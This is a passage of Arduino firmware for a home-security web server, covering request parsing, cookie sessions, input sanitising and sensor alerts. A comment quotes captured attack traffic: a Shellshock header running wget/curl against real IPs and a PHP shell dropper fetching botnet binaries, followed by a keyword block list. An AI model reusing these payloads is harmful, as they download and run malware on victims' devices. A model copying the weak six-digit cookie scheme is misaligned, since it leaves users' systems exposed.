        //Switch LED to blue to indicate file download
        SetRGBLEDLightColour(0, 0, 255, false); //Blue
        DumpFileToBrowser(p_file_or_dir);
      }
    }
    else
      ProcInvalidFileAccessAttempt();
    //
  }
  else if (p_page_number == G_PageNames[32]) {
    if ((UserLoggedIn()) ||
        (LocalIP(G_RemoteIPAddress))) {
      //We entered an IP address on the Failed HTML Request Form
      //Add it to the table or delete it.
      ProcessWebPageIPAddress();
      HackerActivityWebPage();
    }
  }
  else if (p_page_number == G_PageNames[33]) { //Send Test Email
    if (UserLoggedIn()) //You must be logged in
      //We cannot send the email directly because it will kill off this EthernetClient instance
      //So we set this flag and send the email independently within the main processing loop()
      G_SendTestEmail = true;
    //
    SettingsWebPage();
  }
#ifdef D_2WGApp
  else if (p_page_number == G_PageNames[34]) { //Switch Automated Heating Option
    if (UserLoggedIn()) {
      SettingSwitch(EPSR(E_Automated_Heating_210), E_Heating_Mode_10);
      if (EPSR(E_Heating_Mode_10) == C_T) G_HeatMode = true;
      else                                G_HeatMode = false;
    }
    SettingsWebPage();
  }
  else if (p_page_number == G_PageNames[35]) { //Switch Automated Cooling Option
    if (UserLoggedIn()) {
      SettingSwitch(EPSR(E_Automated_Cooling_211), E_Cooling_Mode_11);
      if (EPSR(E_Cooling_Mode_11) == C_T) G_CoolMode = true;
      else                                G_CoolMode = false;
    }
    SettingsWebPage();
  }
  else if (p_page_number == G_PageNames[36]) {
    HomeHeatingWebPage();
  }
  else if (p_page_number == G_PageNames[37]) { //Turn Home Heating Fan On
    if ((UserLoggedIn()) ||
        (LocalIP(G_RemoteIPAddress))) {
      if (!G_AirPumpEnabled) //OFF
        SwitchAirPump(); //ON
      //
    }
    HomeHeatingWebPage();
  }
  else if (p_page_number == G_PageNames[38]) { //Turn Home Heating Fan Off
    if ((UserLoggedIn()) ||
        (LocalIP(G_RemoteIPAddress))) {
      if (G_AirPumpEnabled) //ON
        SwitchAirPump(); //OFF
      //
    }
    HomeHeatingWebPage();
  }
#endif
  else if (p_page_number == G_PageNames[39]) { //UPD NTP Time Update
    if (UserLoggedIn()) { //You must be logged in
      G_UPDNTPUpdate = true;
    }
    SettingsWebPage();
  }
  else if (p_page_number == G_PageNames[40]) { // ALARM ON
    //We have prechecked the local IP address
    //Double check is OK but don't bother with an error response
    if (LocalIP(G_RemoteIPAddress)) { //This URL only valid for a local connection

#ifdef D_2WGApp
      if (digitalRead(DC_GarageClosedPin) == LOW) { //Door is open
        G_PremisesAlarmTimer = millis(); //This suppresses the email alert about the door closing
        GarageDoorOperate(true); //Force closed - even if the door is inactive
      }
#endif

      if (!G_PremisesAlarmActive) //If alarm off we can switch on
        AlarmActivate(); //Switch On (or Off)
      //
      LocalWebPage(true);  //includes EthernetClientStop()
    }
  }

#ifdef D_2WGApp
  else if (p_page_number == G_PageNames[41]) { // GARAGECLOSE
    //We have prechecked the local IP address
    //Double check is OK but don't bother with an error response
    if (LocalIP(G_RemoteIPAddress)) { //This URL only valid for a local connection
      if (digitalRead(DC_GarageClosedPin) == LOW) //Door is open
        GarageDoorOperate(true); //Force closed - even if the door is inactive
      //
      LocalWebPage(true); //includes EthernetClientStop()
    } //skip if not local IP
  }
#endif
  else if (p_page_number == G_PageNames[42]) { // Ethernet Socket Status
    EthernetSocketWebPage();
  }
  else if (p_page_number == G_PageNames[43]) { // File Upload Form
    //You have to be logged in for file uploads to prevent IP address spoofing
    if (UserLoggedIn())
      FileUploadWebPage();
    else
      ProcessInvalidWebPageRequest();
    //
  }
  else if (p_page_number == G_PageNames[44]) { // File Upload
    //You have to be logged in for file uploads to prevent IP address spoofing
    if (!UserLoggedIn())
      ProcessInvalidWebPageRequest();
    else {
      WebSrvrLaunchPage44();
    }
  } //File Upload
  else if (p_page_number == G_PageNames[45]) {
    HackerActivityWebPage();
  }
  else if (p_page_number == G_PageNames[46]) {
    if ((UserLoggedIn()) ||
        (LocalIP(G_RemoteIPAddress))) {
      MemoryBackup();
    }
    SettingsWebPage();
  }
  else if (p_page_number == G_PageNames[47]) {
    StatisticsWebPage();
  }
  else if (p_page_number == G_PageNames[48]) {
    WebCrawlerWebPage();
  }
  else if (p_page_number == G_PageNames[49]) {
    ErrorWebPage();
  }
  else { //Invalid web page
    //This will apply to otherwise valid html requests that cannot be processed because
    //the user is not logged in or did not supply a valid cookie.
    SendHTMLError(Message(M_404_Not_Found_31), Message(M_Invalid_Web_Page_Access_32));
    EthernetClientStop(); //Discards the HTMLParmList (not the cache)
  }

  CheckRAM();
  if (G_EthernetClientActive == true) { //G_EthernetClient not stopped
    //At this point all input from a valid html request should have been processed.
    //If the EthernetClient has not been stopped then the input buffer should be null.
    //Any new incoming data is assumed to be a new request from the same connection
    //and is picked up in the next iteration/invocation of WebServerProcess.
    G_EthernetClientActive = true; //set already
    //After transmission of the web page we set a one second timer
    //to allow transmission to complete.
    G_EthernetClientTimer = millis();

    //Before we get finish with this valid html request we add the
    //IP address (if external) to our list of recent IP addresses
    if ((!LocalIP(G_RemoteIPAddress)) && //Shuffle
        (!CheckRecentIPAddress())) { //Ignore duplicates
      for (byte l_ip_addr = 1; l_ip_addr < G_RecentIPAddressCount; l_ip_addr++) {
        for (byte l_field = 0; l_field < DC_IPAddressFieldCount; l_field++)
          G_Recent_IPAddresses[l_ip_addr].IPField[l_field] = G_Recent_IPAddresses[l_ip_addr - 1].IPField[l_field];
        //
      }
      //Insert latest IP address
      for (byte l_field = 0; l_field < DC_IPAddressFieldCount; l_field++)
        G_Recent_IPAddresses[0].IPField[l_field] = G_RemoteIPAddress[l_field];
      //
    } //If external add to list of recent IP addresses
  }
  Pop(c_proc_num);
} //WebServerPageLaunch

//----------------------------------------------------------------------------------------

void LocalWebPage(const boolean p_url_mask) {
  const byte c_proc_num = 7;
  Push(c_proc_num);  //Internal IP address made an invalid request
  //So we setup and display an error page

  SendHTMLResponse("200 OK", "", true); //response, content_type, blank line terminate
  G_EthernetClient.println(F("<!DOCTYPE HTML>"));
  G_EthernetClient.println(F("<html><head>"));
  G_EthernetClient.println(F("<style type='text/css'>"));
  G_EthernetClient.println(F("table {text-align:center;font-size:20px;background-color:DarkSeaGreen}"));
  G_EthernetClient.println(F("body {font-family:Arial}"));
  G_EthernetClient.println(F("</style>"));

  //This line scales this page on an IOS device
  //G_EthernetClient.println(F("<meta name='viewport' content='width=350'>"));
  G_EthernetClient.println(F("<meta name='viewport' content='width=device-width, initial-scale=1.0'>"));
  if (p_url_mask) {
#ifdef D_2WGApp
    G_EthernetClient.println(F("<meta http-equiv='refresh' content='15; url=http://192.168.2.80/Menu/'>"));
#else
    G_EthernetClient.println(F("<meta http-equiv='refresh' content='15; url=http://192.168.1.88:88/Menu/'>"));
#endif
  }
#ifdef D_2WGApp
  G_EthernetClient.println(F("<title>2WG HOME SECY</title></head>"));
#else
  G_EthernetClient.println(F("<title>GTM MONITOR</title></head>"));
#endif

  if (p_url_mask)
    G_EthernetClient.println(F("<body>redirecting in 15 seconds to /Menu/ ...</body>"));
  else {
    G_EthernetClient.println(F("<body><form id='CWZHAS' method='POST'>"));
    G_EthernetClient.println(F("<table border=0>"));
    G_EthernetClient.println(F("<tr>"));
    G_EthernetClient.println(F("<td style='vertical-align:top;'>"));
    G_EthernetClient.println(F("<table border=1 style='width:300px;height:80px'>"));
    G_EthernetClient.println(F("<tr style='background-color:Khaki;font-size:30px'>"));
#ifdef D_2WGApp
    G_EthernetClient.println(F("<td><b>2WG Home Security</b></td>"));
#else
    G_EthernetClient.println(F("<td><b>GT Monitor</b></td>"));
#endif
    G_EthernetClient.println(F("</tr>"));
    G_EthernetClient.println(F("<tr>"));
    G_EthernetClient.println(F("<td><br>"));
    G_EthernetClient.print(F("<input type='submit' formaction='/"));
    G_EthernetClient.print(G_Website);
    G_EthernetClient.println(F("/' style='width:250px;height:80px;font-size:28px' value='Main Application'>"));
    G_EthernetClient.println(F("<br><br></td>"));
    G_EthernetClient.println(F("</tr>"));
    G_EthernetClient.println(F("<tr style='font-size:20px'>"));
    G_EthernetClient.print(F("<td><br><b>Premises Alarm is : "));
    if (G_PremisesAlarmActive)
      G_EthernetClient.print(F("ON"));
    else
      G_EthernetClient.print(F("OFF"));
    //
    G_EthernetClient.println(F("</b><br><br>"));

    G_EthernetClient.print(F("<input type='submit' formaction='/"));
    if (G_PremisesAlarmActive)
      //ALARMOFF
      G_EthernetClient.print(G_PageNames[30]); //LWB
    else
      //ALARMON
      G_EthernetClient.print(G_PageNames[40]);  //LWB
    //
    G_EthernetClient.print(F("/' style='width:170px;height:70px;font-size:20px' value='"));
    if (G_PremisesAlarmActive)
      G_EthernetClient.print(F("Alarm Off"));
    else
      G_EthernetClient.print(F("Alarm On"));
    //
    G_EthernetClient.println(F("'>"));

    G_EthernetClient.println(F("<br></td>"));
    G_EthernetClient.println(F("</tr>"));

#ifdef D_2WGApp
    G_EthernetClient.println(F("<tr style='font-size:20px'>"));
    G_EthernetClient.print(F("<td><br><b>Garage Door is : "));
    if (digitalRead(DC_GarageClosedPin) == LOW) //Door is not closed
      G_EthernetClient.print(F("OPEN"));
    else
      G_EthernetClient.print(F("CLOSED"));
    //
    G_EthernetClient.println(F("</b><br><br>"));

    G_EthernetClient.print(F("<input type='submit' formaction='/"));
    if (digitalRead(DC_GarageClosedPin) == LOW) //Door is not closed
      //GARAGECLOSE
      G_EthernetClient.print(G_PageNames[41]); //LWB
    else
      //GARAGEOPEN
      G_EthernetClient.print(G_PageNames[29]); //LWB
    //
    G_EthernetClient.print(F("/' style='width:170px;height:70px;font-size:20px' value='"));
    if (digitalRead(DC_GarageClosedPin) == LOW) //Door is not closed
      G_EthernetClient.print(F("Garage Close"));
    else
      G_EthernetClient.print(F("Garage Open"));
    //
    G_EthernetClient.println(F("'>"));

    G_EthernetClient.println(F("<br></td>"));
    G_EthernetClient.println(F("</tr>"));
#endif

    G_EthernetClient.println(F("</table>"));
    G_EthernetClient.println(F("</td>"));
    G_EthernetClient.println(F("</tr>"));
    G_EthernetClient.println(F("</table>"));
    G_EthernetClient.println(F("</form></body>"));
  }
  G_EthernetClient.println(F("</html>"));
  EthernetClientStop(); //Discards the HTMLParmList (not the cache)
  CheckRAM();
  Pop(c_proc_num);
} //LocalWebPage

//---------------------------------------------------------------------------------------

boolean WebSvrStripHTMLReq(const int p_request) {
  const byte c_proc_num = 10;
  Push(c_proc_num);
  //We have already stripped the first line, the HTML GET/POST request, before this procedure is ever called.
  //Strip info from the next line of the HTML request.
  //We call this procedure multiple times in an iteration loop to strip remaining data.
  //We strip from after the GET/POST line to a blank line or end.
  //This covers everything except form data, including multi-part form data used for file uploads.
  //Return true when we have finished - blank line or EOF encountered
  //Return false after processing each line and to continue iterative processing.
  //l_line and l_field string space will be rolled back off the heap between each call to this procedure.

  //Example HTML request for the application dashboard
  //GET /2WG/ HTTP/1.1 <<THIS FIRST LINE HAS BEEN STRIPPED ALREADY>>
  //Host: www.2wg.co.nz
  //User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0
  //Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  //Accept-Language: en-nz,th;q=0.5
  //Accept-Encoding: gzip, deflate
  //DNT: 1
  //Cookie: CWZSID=177728
  //Connection: keep-alive

  //By a previous call to G_EthernetClient.available() we know that there is some data waiting
  //Get the next line - and check if it is the blank line that ends the list of html request fields
  //Any line > 128 chars will be problematic
  String l_line;
  l_line.reserve(130);
  l_line = ExtractECLineMax(128, true); //Perform XSS transformation
  l_line.trim();
  //Serial.println(l_line);
  //If we get a blank line we have finished.
  //The calling proc includes a maximum two second delay to ensure all
  //html request field data gets to us in the socket.
  if (l_line == "") { //We have finished the iterative looping
    CheckRAM();
    Pop(c_proc_num);
    return true; //EOF (blank line)
  }
  l_line.toUpperCase();
  String l_field = "";

  //The following fields can be found in the first part of an HTML request (see example above)
  //We are only extracting some of the fields but could easily add more if required.
  //Fields in the HTML request that we do not want are simply ignored.
  if (l_line.substring(0, 11) == EPSR(E_USERhyAGENTco_265)) {
    WebSvrChkUserAgent(l_line); //Webserver agent with write HTMLWrite() after processing
  }
  else if (l_line.substring(0, 5) == EPSR(E_FROMco_301)) {
    WebSvrChkUserAgent(l_line);
  }
  else {
    HTMLWrite("- " + l_line);
    if (l_line.substring(0, 6) == EPSR(E_HOSTco__127)) {
      l_field = l_line.substring(6);
      l_field.trim();
      if (l_field != "")
        HTMLParmInsert(E_HOST_230, l_field);
      //
    }
    else if (l_line.substring(0, 8) == EPSR(E_REFERERco_331)) {
      if (l_line.indexOf(EPSR(E_ARDUINO_332)) != -1)
        HTMLParmInsert(E_ARDUINO_332, "T");
      //
    }
    else if (l_line.substring(0, 8) == EPSR(E_COOKIEco__128)) {
      //Serial.println(l_line_upper);
      //Multiple cookies can will be one line - e.g. "Cookie: SID=366706; GTMSID=132037"
      l_line = l_line.substring(8); //Discard "Cookie: " Fieldname
      String l_field;
      while (true) {
        //Strip the next cookie on the line
        int l_posn = l_line.indexOf(";");
        if (l_posn != -1) {
          l_field = l_line.substring(0, l_posn);
          l_line = l_line.substring(l_posn + 1);
        }
        else {
          l_field = l_line;
          l_line = "";
        };
        l_field.trim();

        l_posn = l_field.indexOf(G_Website + EPSR(E_SIDeq_129));
        if (l_posn != -1) {
          l_field = l_field.substring(l_posn + 7); //STRIP CWZSID=
          l_field.trim();
          if (l_field.length() == 6)
            HTMLParmInsert(E_COOKIE_232, l_field);
          //
        } //We ignore cookies that are not XXXSID=
        if (l_line == "")
          break;
        //
      } //Process each cookie field
    }
    else if (l_line.substring(0, 13) == EPSR(E_CONTENThyTYPEco_266)) {
      //Multipart forms are used for file uploads.
      //We have to extract the boundary - it delineates file data further down in the html request data stream
      if (l_line.indexOf(EPSR(E_MULTIPART_267)) != -1) { //FILE UPLOAD
        //Look for boundary
        byte l_pos = l_line.indexOf(EPSR(E_BOUNDARYeq_268));
        if (l_pos != -1) {
          l_field = l_line.substring(l_pos + 9); //case sensitive
          l_field.trim();
          if (l_field != "")
            HTMLParmInsert(E_BOUNDARY_233, l_field);
          //
        }
      }
    }
    else if (l_line.substring(0, 15) == EPSR(E_CONTENThyLENGTHco_269)) {
      //Content length applies to both form and multipart form html requests
      //which we further process later.
      //We extract the length value so that during form processing we can cross check
      //that we have processed exactly the correct and full length of data.
      //This is important to ensure that we load exactly the right count of byte data for file uploads.
      l_field = l_line.substring(15);
      l_field.trim();
      if (l_field != "")
        HTMLParmInsert(E_LENGTH_234, l_field);
      //
    }
  } //Not User Agent or From

  //We ignore HTML request fields that we do not want.
  //The fields we want have been loaded into the HTML parm linked list from where they can
  //be extracted at any time while processing the current ethernetclient request.

  CheckRAM();
  Pop(c_proc_num);
  return false; //not EOF (blank line)
} //WebSvrStripHTMLReq

//----------------------------------------------------------------------------------------

void WebSvrChkUserAgent(const String &p_line) {
  //Here we process the User-Agent: and From: html request strings
  //We start with up to 128 bytes
  //We process the data in a loop involving extra 64 byte chucks
  //The allows us to process the whole User-Agent: and From: line
  //without using a big String record
  //p_line is reserved for 130 bytes
  //HOWEVER:
  //We only process the first 256 bytes to avoid a hacker crashing the system
  //with long field values that we write to the heap cache.
  const byte c_proc_num = 91;
  Push(c_proc_num);

  const int C_Mobile_Count = 2;
  const String C_Mobiles[C_Mobile_Count] = {"IPHONE", "MOBILE"};

  const String C_IPAD = "IPAD"; //Not iPad
  boolean l_ipad = false;

  HTMLWrite("- " + p_line); //already upperCase()
  String l_line = p_line;
  int l_length = l_line.length();
  while (true) {

    //Check for web crawlers
    //Only count once for each html request
    //We are looking in the defined list of web crawlers
    for (int l_index = 0; l_index < G_CrawlerCount; l_index++) {
      if (l_line.indexOf(G_WebCrawlers[l_index]) != -1) {
        G_StatCrwlMth[l_index]++;
        G_StatCrwlDay[l_index]++;
        G_Web_Crawler_Index = l_index;
        break;
      }
    }

    if (l_line.indexOf(C_IPAD) != -1)
      l_ipad = true;
    //iPads are never mobile devices

    //Check for mobile browsers
    for (int l_index = 0; l_index < C_Mobile_Count; l_index++) {
      if (l_line.indexOf(C_Mobiles[l_index]) != -1) {
        G_Mobile_Flag = true;
      }
    }

    if (l_line.indexOf(EPSR(E_DOWNTHEMALL_302)) != -1) {
      G_DownThemAll_Flag = true;
      break;
    }

    if (G_Web_Crawler_Index != -1)
      break;
    //

    if (G_HTML_Req_EOL)
      break;
    //

    //We process no more than 256 bytes
    if (l_length >= 256)
      break;
    //

    //we are not finished yet
    //Shuffle the data line and get another 64 bytes
    //This should be OK
    l_line = l_line.substring(64); //discard first 64 bytes
    l_line += ExtractECLineMax(64, true); //Perform XSS transformation
    l_length += 64;
    l_line.toUpperCase();
    HTMLWrite("- +" + l_line.substring(64));
  } //while (true) - process User-Agent: and From: string in 64 byte chunks

  //discard/print any residual line data
  while (true) {
    //Exit when the whole line has been read
    if (G_HTML_Req_EOL)
      break;
    //
    ExtractECLineMax(64, false); //Do not transform - we are discarding
  }

  //ipads are never mobiles
  if (l_ipad)
    G_Mobile_Flag = false;
  //

  CheckRAM();
  Pop(c_proc_num);
}  //WebSvrChkUserAgent

//----------------------------------------------------------------------------------------

boolean WebSvrScriptXForm(String &p_line_upper) {
  //This procedure is applied to all input data from an html request
  //as extracted by ExtractECLineMax()
  const byte c_proc_num = 99;
  Push(c_proc_num);
  //Transform any apparent hacking scripts
  /*
    - User-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://88.198.96.10/wget ;
    - curl http://88.198.96.10/curl ; fetch http://88.198.96.10/fetch ; lwp-download http://88.198.96.10/lwp-download ;
    - GET http://88.198.96.10/GET ; lynx http://88.198.96.10/lynx ");'

    - <?php
    - echo "Zollard";
    - $disablefunc = @ini_get("disable_functions");
    - if (!empty($disablefunc))
    - {
    - $disablefunc = str_replace(" ","",$disablefunc);
    - $disablefunc = explode(",",$disablefunc);
    - }
    - function myshellexec($cmd)
    - {
    - global $disablefunc;
    - $result = "";
    - if (!empty($cmd))
    - {
    - if (is_callable("exec") and !in_array("exec",$disablefunc)) {exec($cmd,$result); $result = join("\n",$result);}
    - elseif (($result = `$cmd`) !== FALSE) {}
    - elseif (is_callable("system") and !in_array("system",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $resu
    - lt = @ob_get_contents(); @ob_clean(); echo $v;}
    - elseif (is_callable("passthru") and !in_array("passthru",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd);
    - $result = @ob_get_contents(); @ob_clean(); echo $v;}
    - elseif (is_resource($fp = popen($cmd,"r")))
    - {
    - $result = "";
    - while(!feof($fp)) {$result .= fread($fp,1024);}
    - pclose($fp);
    - }
    - }
    - return $result;
    - }
    - MYSHELLEXEC("RM -RF /TMP/ARMEABI;WG** -P /TMP HT**://175.11.7.109:58455/ARMEABI;CHMOD +X /TMP/ARMEABI");
    - MYSHELLEXEC("RM -RF /TMP/ARM;WG** -P /TMP HT**://175.11.7.109:58455/ARM;CHMOD +X /TMP/ARM");
    - MYSHELLEXEC("RM -RF /TMP/PPC;WG** -P /TMP HT**://175.11.7.109:58455/PPC;CHMOD +X /TMP/PPC");
    - MYSHELLEXEC("RM -RF /TMP/MIPS;WG** -P /TMP

  */

  //E_XSS_KeyWords_313
  //{"SCRIPT", "PERL", "WGET", "CURL", "FETCH", "DOWNLOAD", "LYNX", "USR/BIN", "SHELL", "EXEC", "/TMP/", "DISABLE", "EOF", "ELSE", "FUNCTION", "SYMPHO", "BASE64"};
  boolean l_result = false;
  //E_XSS_KeyWords_313 is an underscore delimited list of typical script words
  int l_posn = E_XSS_KeyWords_313;
  String l_word = "";
  l_word.reserve(10);
  while (l_posn != -1) {
    l_word = EPFR(l_posn, '_');
    if (p_line_upper.indexOf(l_word) != -1) {
      l_result = true;
      //Using CharRepeat we retain the same data length as originally input
      p_line_upper.replace(l_word, l_word.substring(0, 2) + CharRepeat('*', l_word.length() - 2));
    }
  } //Remove each script word
  if (l_result) {
    G_Hack_Flag = true;
    G_XSS_Hack_Flag = true; //We totally ignore XSS hackers
  }
  CheckRAM();
  Pop(c_proc_num);
  return l_result;
} //WebSvrScriptXForm()

//----------------------------------------------------------------------------------------

boolean WebServerStripHTMLFormData(int p_request) {
  const byte c_proc_num = 82;
  Push(c_proc_num);
  //We have already stripped the HTML GET/POST request (first line)
  //We have already stripped other html request data.
  //We now process html form data resulting from an html POST request.
  //Multipart form data associated with a file upload is processed elsewhere.
  //We process the data line-by-line until a blank line or EOF is encountered.
  //We assume the data available in the socket is all the data.
  //We process what is available and do not wait for more.
  //We anticipate a single line of data with ampersand delineation.
  //We only load data into our HTML parm cache for known fieldnames.
  //This prevents hackers killing the system by overflowing RAM with a large number of bogus
  //fieldnames (loading into the HTML parm linked list) that this system does not require.

  //l_line and l_field string space will be rolled back off the heap between each call to this procedure.

  const int C_Line_Length = 50;

  String l_fieldname;
  String l_field;
  String l_data;
  String l_line;
  int l_ampersand = 0;
  int l_equal = 0;

  l_data = "";
  l_line.reserve(C_Line_Length + 1);
  while (true) {
    l_line = ExtractECLineMax(C_Line_Length, true); //Perform XSS transformation
    if ((l_line != "") && (l_line.indexOf(EPSR(E_PASSWORD_231)) == -1))
      //We don't write form password field data to the html request logs
      HTMLWrite("- " + l_line);
    //
    l_data += l_line;

    if ((l_data == "") && (l_line == "")) {
      break;
    }

    //Now process l_data as much as possible (one or more fields)
    //We can then iterate around and read more data to process
    while (true) {
      l_field = "";
      l_ampersand = l_data.indexOf('&');
      if (l_ampersand != -1) {
        //Process the first of multiple fields on the data line
        l_field = l_data.substring(0, l_ampersand);
        l_data  = l_data.substring(l_ampersand + 1);
      }
      else if ((l_data != "") && (l_line == "")) {
        //The last line read extracted nothing
        //So we take the rest of l_data for the final data field
        l_field = l_data;
        l_data  = "";
      }
      else { //Break out of inner loop if there is not a complete field to process
        //However if l_data is greater than 80 chars discard it
        //to stop hackers crashing the system with very long data fields.
        //We never expect field data to be anywhere near 80 chars.
        if (l_data.length() > 80)
          l_data = "";
        //
        break;
      }

      //Now process the field
      //Serial.println(l_field);
      //It should be a fieldname, equal sign, and some field data
      l_equal = l_field.indexOf('=');
      if (l_equal != -1) {
        //Strip off the fieldname - before the equal sign
        l_fieldname = l_field.substring(0, l_equal);
        l_fieldname.toUpperCase();
        //Strip off the field data - after the equal sign
        l_field = l_field.substring(l_equal + 1);
        l_field.trim();
        //More character substitution (replace) likely required here
        l_field.replace("%2F", "/");

        if (l_field != "") {
          //Now load the field into the HTML parm linked list
          //We only accept fields known to the application and particular forms
          //We restrict the length of data to the expected maximum field length
          //We use the EEPROM memory position (integer) as the fieldname ID in the HTML parm linked list
          if ((l_fieldname == EPSR(E_PASSWORD_231)) && (p_request == G_PageNames[17])) //password login
            HTMLParmInsert(E_PASSWORD_231, l_field.substring(0, 9));
          else if ((l_fieldname == EPSR(E_FOLDER_235)) &&
                   ((p_request == G_PageNames[5]) || (p_request == G_PageNames[43]))) //directory browse or file upload
            HTMLParmInsert(E_FOLDER_235, l_field.substring(0, 80));
          else if ((l_fieldname == EPSR(E_FNAME_240)) && (p_request == G_PageNames[5])) //directory browse
            HTMLParmInsert(E_FNAME_240, l_field.substring(0, 12));
          else if ((l_fieldname == EPSR(E_FILEDELETE_239)) && (p_request == G_PageNames[5])) //directory browse
            HTMLParmInsert(E_FILEDELETE_239, l_field.substring(0, 10));
          else if ((l_fieldname == EPSR(E_IPADDRESS_296)) && (p_request == G_PageNames[32])) {//Add/delete IP Addresses from the Banned Table
            HTMLParmInsert(E_IPADDRESS_296, l_field.substring(0, 15));
          }
          // All extraneous (bogus) fields are ignored
        } //Don't process NULL fields
      } //Ignore any field data without an equal separator

      if (l_data == "") {
        break;
      }
    } //Process l_data as much as possible

    if ((l_data == "") && (l_line = "")) {
      break;
    }
  } //Process the input data C_Line_Length bytes at a time

  CheckRAM();
  Pop(c_proc_num);
} //WebServerStripHTMLFormData

//----------------------------------------------------------------------------------------
//WEB SERVER SECURITY
//----------------------------------------------------------------------------------------

void CookieTimeOutCheck() {
  const byte c_proc_num = 11;
  Push(c_proc_num);
  //discard cookies that have timed out
  for (byte l_index = 0; l_index < DC_Cookie_Count; l_index++) {
    if (G_CookieSet[l_index].Active) {
      if (CheckSecondsDelay(G_CookieSet[l_index].StartTime, C_OneMinute * 10)) {
        //Serial.println(F("Cookie Timeout"));
        G_CookieSet[l_index].Active = false;
      }
    }
  }
  CheckRAM();
  Pop(c_proc_num);
} //CookieTimeOutCheck

//----------------------------------------------------------------------------------------

boolean GetANewCookie() {
  const byte c_proc_num = 112;
  Push(c_proc_num);
  CookieTimeOutCheck();

  //Get a a new cookie if there is an available slot
  for (byte l_index = 0; l_index < DC_Cookie_Count; l_index++) {
    if (!G_CookieSet[l_index].Active) {
      //Refresh the random number sequence everytime we need a new cookie using elapsed runtime.
      randomSeed(millis() + analogRead(3)); //analogRead(3) gives a random number between 0 and 1023 from unused analog pin 3
      G_CookieSet[l_index].Active    = true;
      G_CookieSet[l_index].StartTime = millis();
      for (byte l_ip = 0; l_ip < DC_IPAddressFieldCount; l_ip++)
        G_CookieSet[l_index].IPAddress[l_ip] = G_RemoteIPAddress[l_ip];
      //
      G_CookieSet[l_index].Cookie = random(900000) + 100000L; //A six digit value btw 100000 and 999999
      HTMLParmInsert(E_COOKIE_232, String(G_CookieSet[l_index].Cookie));
      CheckRAM();
      Pop(c_proc_num);
      return true;
    }
  }
  CheckRAM();
  Pop(c_proc_num);
  return false;
} //GetANewCookie

//----------------------------------------------------------------------------------------

void CheckACookie() {
  const byte c_proc_num = 113;
  Push(c_proc_num);
  //If the HTML parm list cookie is not valid then delete it
  CookieTimeOutCheck();

  //Extract the cookie from the HTML parm list
  long l_cookie = HTMLParmRead(E_COOKIE_232).toInt();
  if (l_cookie == 0) {
    //Presumably some characters in there - anyway it is not valid
    HTMLParmDelete(E_COOKIE_232);
    HTMLWrite(EPSR(E_hy_Cookie_Deleted_303));
    CheckRAM();
    Pop(c_proc_num);
    return;
  }
  for (byte l_index2 = 0; l_index2 < DC_Cookie_Count; l_index2++) {
    if (G_CookieSet[l_index2].Active == true) {
      if (G_CookieSet[l_index2].Cookie == l_cookie) {
        boolean l_all_ok = true;
        for (byte l_ip = 0; l_ip < DC_IPAddressFieldCount; l_ip++) {
          if (G_CookieSet[l_index2].IPAddress[l_ip] != G_RemoteIPAddress[l_ip]) {
            l_all_ok = false;
            break;
          }
        } //check same IP address
        if (l_all_ok) {
          CheckRAM();
          Pop(c_proc_num);
          return;
        }
      } //select a matching cookie number
    } //only check active cookies
  }  //for each cookie

  //The cookie did not check out so delete it
  //Cookie session security is not applied if the cookie is deleted
  HTMLParmDelete(E_COOKIE_232);
  HTMLWrite(EPSR(E_hy_Cookie_Deleted_303));
  CheckRAM();
  Pop(c_proc_num);
}  //CheckACookie

//----------------------------------------------------------------------------------------
//FIRE DETECTION
//----------------------------------------------------------------------------------------

void FireProcess() {
  const byte c_proc_num = 13;
  Push(c_proc_num);
  //We do a fire alarm check every two minutes
  if (CheckSecondsDelay(G_FireTimer, C_OneMinute * 2) == false) {
    Pop(c_proc_num);
    return;
  }

  CheckRAM();
  int l_temp, l_hum = 0;
  int l_temps_now[DC_SensorCountTemp];
  for (byte l_sensor = 0; l_sensor < DC_SensorCountTemp; l_sensor++)
    l_temps_now[l_sensor] = 1000;
  //
  //Take the lowest of four readings to eliminate any occasional high reading errors
  //(Would an average be better over a bigger sample?)
  for (byte l_count = 1; l_count <= 4; l_count++) {
    //We don't extract new DHT readings until at least two seconds after any previous readings
    while (CheckSecondsDelay(G_DHTDelayTimer, C_OneSecond * 2) == false) {
    }//Do Nothing
    G_DHTDelayTimer = millis();
    for (byte l_sensor = 0; l_sensor < DC_SensorCountTemp; l_sensor++) {
      if (DHTRead(l_sensor, l_temp, l_hum) == DHTLIB_OK) {
        if (l_temp != 0) {
          if (l_temps_now[l_sensor] > l_temp)
            l_temps_now[l_sensor] = l_temp;
          //
        }
      }
    }
    //DHT22 sensors cannot be polled more than once every two seconds
  } //read each sensor four times - take the lowest reading

  //Now process the sensor readings
  for (byte l_sensor = 0; l_sensor < DC_SensorCountTemp; l_sensor++) {
    if (l_temps_now[l_sensor] != 1000) {
      //Now check maximum temperature - if over the 40/50 degree limit we issue an alert
      if (l_temps_now[l_sensor] > (C_SensorMaxTemp[l_sensor])) {
        //The email heading is automatically written to the activity log
        //The success or failure or the email is automatically written to the activity log
        EmailInitialise(Message(M_HIGH_TEMPERATURE_ALERT_9));
        EmailLine(EPSR(E_SENSORco__111)     + C_SensorList[l_sensor]);
        EmailLine(EPSR(E_tbMAX_TEMPco__114) + TemperatureToString(C_SensorDHT11[l_sensor], C_SensorMaxTemp[l_sensor], true));
        EmailLine(EPSR(E_tbTEMP_NOWco__113) + TemperatureToString(C_SensorDHT11[l_sensor], l_temps_now[l_sensor], true));
        EmailDisconnect();
      } //check max temp
    } //ignore dead sensors
  } //for each sensor

  CheckRAM();
  G_FireTimer = millis(); //Reset the timer
  Pop(c_proc_num);
} //FireProcess

//----------------------------------------------------------------------------------------
//GARAGE FUNCTIONALITY
//----------------------------------------------------------------------------------------

#ifdef D_2WGApp
void SwitchGarageBuzzerOn() {
  const byte c_proc_num = 14;
  Push(c_proc_num);
  //Not running
  G_GarageBuzzerTimer     = millis();
  G_GarageBuzzerOneSecond = G_GarageBuzzerTimer;
  G_GarageBuzzerOn        = true;
  digitalWrite(DC_GarageBuzzerPin, HIGH);
  CheckRAM();
  Pop(c_proc_num);
} //SwitchGarageBuzzerOn

//----------------------------------------------------------------------------------------

void SwitchGarageBuzzerOff() {
  const byte c_proc_num = 15;
  Push(c_proc_num);
